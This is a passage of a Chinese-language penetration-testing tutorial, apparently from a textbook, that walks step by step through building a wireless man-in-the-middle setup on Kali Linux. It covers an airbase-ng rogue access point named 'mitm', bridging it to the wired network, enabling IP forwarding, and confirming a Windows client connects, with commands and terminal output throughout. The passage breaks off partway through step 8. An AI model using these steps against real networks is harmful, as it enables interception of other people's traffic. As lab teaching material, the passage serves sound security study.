  mdcn: "\n## 无线中间人攻击环境搭建\n### 步骤1：创建名为mitm的软接入点\n请按照以下说明开始操作：\n要搭建中间人攻击环境，我们首先会在攻击者笔记本上使用airbase-ng工具创建一个名为mitm的软接入点。我们执行以下命令：\n\
    ```airbase-ng --essid mitm -c 11 mon0```\n命令输出如下：\n```root@kali:~# airbase-ng\
    \ --essid mitm -c 11 mon0\n11:48:59 Created tap interface at0\n11:48:59 Trying\
    \ to set MTU on at0 to 1500\n11:48:59 Access Point with BSSID 80:1F:02:8F:34:D5\
    \ started.\n```\n### 步骤2：记录airbase-ng创建的at0接口\n需要注意，airbase-ng运行时会产生一个名为at0的接口（即tap虚拟网卡）。可以将其视为软件接入点mitm的有线侧接口：\n\
    ```root@kali:~# ifconfig at0\nat0      Link encap:Ethernet  HWaddr 80:1f:02:8f:34:d5\n\
    \          BROADCAST MULTICAST  MTU:1500  Metric:1\n          RX packets:0 errors:0\
    \ dropped:0 overruns:0 frame:0\n          TX packets:0 errors:0 dropped:0 overruns:0\
    \ carrier:0\n          collisions:0 txqueuelen:500\n          RX bytes:0 (0.0\
    \ B)  TX bytes:0 (0.0 B)\n```\n### 步骤3：在攻击者笔记本上创建网桥\n接下来我们要在攻击者笔记本上创建一个网桥，该网桥由有线网卡（eth0）和无线接口（at0）组成。所需的命令依次如下：\n\
    - [x] brctl addbr mitm-bridge\n- [x] brctl addif mitm-bridge eth0\n- [x] brctl\
    \ addif mitm-bridge at0\n- [x] ifconfig eth0 0.0.0.0 up\n- [x] ifconfig at0 0.0.0.0\
    \ up\n命令输出如下：\n```root@kali:~# ifconfig at0\nat0      Link encap:Ethernet  HWaddr\
    \ 80:1f:02:8f:34:d5\n          BROADCAST MULTICAST  MTU:1500  Metric:1\n     \
    \     RX packets:0 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:0\
    \ errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:500\n\
    \          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\nroot@kali:~# brctl addbr mitm-bridge\n\
    root@kali:~# brctl addif mitm-bridge eth0\nroot@kali:~# brctl addif mitm-bridge\
    \ at0\nroot@kali:~# ifconfig eth0 0.0.0.0 up\nroot@kali:~# ifconfig at0 0.0.0.0\
    \ up\n```\n### 步骤4：为网桥分配IP地址并验证连通性\n我们可以为该网桥分配IP地址，并检查与网关的连通性。请注意，我们也可以使用DHCP来完成这一步。我们可以通过以下命令为网桥接口分配IP地址：\n\
    ```ifconfig mitm-bridge 192.168.0.199 up```\n之后我们可以尝试ping网关192.168.0.1，来确认我们已经连接到整个网络。\n\
    ### 步骤5：开启内核的IP转发功能\n现在我们要开启内核的IP转发功能，以确保路由和包转发能够正常进行，使用的命令如下：\n```echo 1 > /proc/sys/net/ipv4/ip_forward```\n\
    ### 步骤6：连接无线客户端并验证连通性\n现在我们将无线客户端连接到我们的mitm接入点，它将通过DHCP（运行在有线侧网关上的服务器）自动获取IP地址。本例中客户端获取到的IP地址为192.168.0.197。我们可以ping有线侧网关192.168.0.1来验证连通性。客户端的IP配置如下：\n\
    ```C:\\Users\\vivek\\AppData\\Local\\msf32>ipconfig\nWindows IP Configuration\n\
    \nWireless LAN adapter Wireless Network Connection:\n\nConnection-specific DNS\
    \ Suffix  . :\nLink-local IPv6 Address . . . . . : fe80::693d:fad9:1424:c019%11\n\
    IPv4 Address. . . . . . . . . . . : 192.168.0.197\nSubnet Mask . . . . . . . .\
    \ . . . : 255.255.255.0\nDefault Gateway . . . . . . . . . : 192.168.0.1\n```\n\
    ### 步骤7：验证网关的ping响应\n我们可以看到主机响应了ping请求，示例如下：\n```C:\\Users\\vivek\\AppData\\Local\\\
    msf32>ping 192.168.0.1\n\nPinging 192.168.0.1 with 32 bytes of data:\nReply from\
    \ 192.168.0.1: bytes=32 time=11ms TTL=64\nReply from 192.168.0.1: bytes=32 time=6ms\
    \ TTL=64\nReply from 192.168.0.1: bytes=32 time=18ms TTL=64\nReply from 192.168.0.1:\
    \ bytes=32 time=8ms TTL=64\n\nPing statistics for 192.168.0.1:\n    Packets: Sent\
    \ = 4, Received = 4, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n\
    \    Minimum = 5ms, Maximum = 18ms, Average = 10ms\n```\n### 步骤8：通过airbase-ng终端验证客户端连接\n\
    我们还可以通过查看攻击者设备上的airbase-ng终端来确认客户端已连接：\n```root@kali:~# airbase-ng --essid mitm\
    \ -c 11 mon0\n12:04:42 Created tap interface at0\n12:04:42 Trying to set MTU on\
